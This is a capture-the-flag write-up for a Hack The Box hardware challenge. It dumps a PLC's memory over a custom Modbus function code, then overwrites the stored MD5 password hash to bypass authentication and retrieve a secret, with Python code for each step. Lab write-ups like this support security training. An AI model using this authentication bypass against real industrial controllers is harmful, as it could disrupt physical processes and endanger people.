---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "easy"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - challenge
  - ics
  - scada
  - plc
  - modbus
  - md5
  - firmware
---

# Sneak peek

## Overview

**Category:** hardware
**Difficulty:** easy
**Platform:** Hack The Box
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> > As the crew delves into their quest for acetone peroxide, they stumble upon a decrepit bread factory. Intrigued by the potential for cooperation, they approach the factory and meet the Responders faction, composed of settlers, firefighters, police officers, and medics. The Responders agree to trade acetone peroxide in exchange for the crew's help in restoring the factory to full functionality. With the PLCs in hand, the crew sets up a temporary workshop within the factory's maintenance room. The hackers and engineers collaborate to analyze the aged devices, which are layered with outdated but intricate security protocols. They hook one of the PLCs up to their portable workstation and begin the painstaking process of analyzing the custom protocol used to store the password and secret data in it. Their only lead is that the password is stored in the Memory Block of the PLC under an uncrackable MD5 hash.

## Enumeration

The PLC exposes a custom Modbus-like protocol on TCP. I installed `pymodbus` (v3.5.4, needed for the socket framer classes) and drove the "custom protocol" PDU:

- **Function code:** `0x64` (user-defined)
- **Sub-commands carried in the PDU:**
  - `0x20` = READ_MEMORY_BLOCK
  - `0x21` = WRITE_MEMORY_BLOCK
  - `0x22` = GET_SECRET
- **DUA layout:** `[session(1)] [code(1)] [data...]`; a 16-bit response status `0xE009` = `Authorization Error: Invalid password`

## Vulnerability

The PLC is a "black box" behind an insecure custom protocol: the memory block holding the password hash and the secret data can be read and written freely once the protocol framer is understood. The password is only protected by being stored as an MD5 digest ("uncrackable"), and the secret is only released after a correct password write.

## Exploitation

I implemented a `ModbusRequest` / `ModbusResponse` subclass so `pymodbus` could encode/decode the custom PDU, registered it on a `ModbusSocketFramer`, and used the provided `send_packet()` helper.

### 1. Dump the memory block

Read the 16KB memory block in 256-byte chunks (64 reads), incrementing a 3-byte address starting at `0x000000`:

```python
address = [0x00, 0x00, 0x00]
read_length = 0xFF
memory_block_data = []
for i in range(64):                       # 64 * 256 == 16 * 1024
    data = address + [read_length]
    code, status, data = send_packet(client, SESSION, READ_MEMORY_BLOCK, data)
    if all(b == 0xFF for b in data):
        break
    memory_block_data += data
    address = increment_address(address, read_length)
```

### 2. Find the password hash entry

Sequences are 0x00-terminated, so I split the dump on `0x00` and collected the entry that looks like the stored password. The stored password is 16 raw bytes — the MD5 digest of the plaintext password:

```python
memory_block_entries = split_list_at_value(memory_block_data, 0x00)
hash_entry = []
for entry in memory_block_entries:
    if len(entry) >= 16:
        hash_entry += entry

hash_entry_index = find_sublist_index(memory_block_data, hash_entry)
```

### 3. Overwrite the hash with a password I control

The PLC executes `WRITE_MEMORY_BLOCK` (0x21) at whatever address I give. I wrote the MD5 of my chosen password (`new_password`) over the stored hash. In total, I tried each byte offset of the hash's 16 bytes (in case the check starts elsewhere) by re-writing the digest then immediately calling `GET_SECRET` (0x22) with the plaintext password:

```python
passowrd = 'new_password'
hashed = hashlib.md5(passowrd.encode()).digest()
hashed_list = list(hashed)

for increment in range(16):
    addr = int_to_3_byte_list(hash_entry_index + increment)
    send_packet(client, SESSION, WRITE_MEMORY_BLOCK, addr + hashed_list)
    code, status, data = send_packet(client, SESSION, GET_SECRET, string_to_list_of_ints(passowrd))
    if len(data) > 2:
        print('Found correct hash address!', ''.join(chr(c) for c in data))
        break
```

Once the PLC accepted my password hash, `GET_SECRET` returned the flag.

> [!info] Tools Used
>
> - `python3` + `pymodbus==3.5.4`
> - `hashlib`, `struct`

## Flag

`HTB{...}`

## References

- https://x3ric.com/blog/posts/HackTheBox-Sneak-peek-Challenge/
- https://app.hackthebox.com/challenges/723